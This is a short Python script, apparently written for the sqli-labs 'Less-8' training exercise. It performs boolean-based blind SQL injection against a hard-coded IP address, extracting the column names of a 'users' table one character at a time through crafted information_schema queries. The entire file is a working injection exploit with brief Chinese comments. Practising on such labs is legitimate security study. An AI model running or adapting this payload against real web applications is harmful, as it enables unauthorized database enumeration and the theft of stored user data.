# -*- coding:utf8 -*-
import requests
list1 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
         'w', 'x', 'y', 'z', '@', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '-', '|', '_', 'A', 'B', 'C', 
         'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 
         'Z', '.']  # 字典
url = 'http://47.104.232.176:9002/Less-8?id=1%27'
payload = '%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security' \
          '%27%20and%20table_name=%27users%27%20limit%20{w},1),{n})=%27{c}%27%20--%20k'
# payload其实就是url的后半部分,也是盲注的关键代码,也可以和url变量合并
column = ['', '', '', '', '']
str = 'You are in...........'
# 以上四个变量就是与本次盲注相关的变量了
for j in range(0, 3):
    for i in range(1, 9):
        for l in list1:
            p = payload.format(w=j, n=i, c=column[j]+l)
            u = requests.get(url+p)
            if 'You' in u.text:
                column[j] += l
                print (u'正在对比第', j+1, u'个字段第', i, u'个字符', column[j])
                break
for c in range(0, 5):
    print ('column', c+1, '-->', column[c])
a = raw_input()
